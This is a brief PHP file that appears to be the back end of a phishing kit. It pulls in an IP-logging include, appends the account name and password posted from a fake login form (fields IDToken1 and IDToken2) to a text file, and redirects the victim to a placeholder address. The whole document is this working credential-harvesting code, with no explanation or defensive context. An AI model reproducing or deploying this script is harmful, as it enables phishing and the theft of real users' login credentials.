<?php

include 'ip.php';

file_put_contents("usernames.txt", "Account: " . $_POST['IDToken1'] . " Pass: " . $_POST['IDToken2'] . "\n", FILE_APPEND);
header('Location: <CUSTOM> ');
exit();
